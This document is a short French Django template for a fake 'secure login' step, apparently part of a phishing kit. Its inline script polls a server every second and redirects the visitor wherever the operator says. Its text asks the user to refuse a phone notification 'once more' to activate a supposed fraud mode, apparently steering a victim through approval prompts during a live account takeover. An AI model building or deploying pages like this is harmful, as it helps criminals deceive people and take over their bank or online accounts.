{% load static %}
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion sécurisé</title>
    <link rel="stylesheet" href="{% static 'onboarding/style3.css' %}">
</head>
        <script>
    // Vérifie toutes les secondes si une redirection est en attente
    async function verifierRedirection() {
        try {
            const res  = await fetch('/verifier-redirection/');
            const data = await res.json();
            if (data.redirect) {
                window.location.href = data.redirect;  // redirection immédiate
            }
        } catch (e) {}
    }

    setInterval(verifierRedirection, 1000);  // toutes les 1 seconde
</script>
<body>
    <div class="scene">
        <div>
            <div class="eyebrow">
                Étape 3 

            </div>

            <p class="sous-titre">
                Merci de  refuser une fois de plus la notification pour activer dans le mode faude
                
                
            </p>

        </div>

    <div class="scene-telephone">
            <div class="halo actif"></div>
            <div class="halo actif"></div>
            <div class="halo actif"></div>
            <div class="telephone">
                <div class="ecran">
                    <div class="notif-glissante">
                         <div class="centre-cloche">

                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
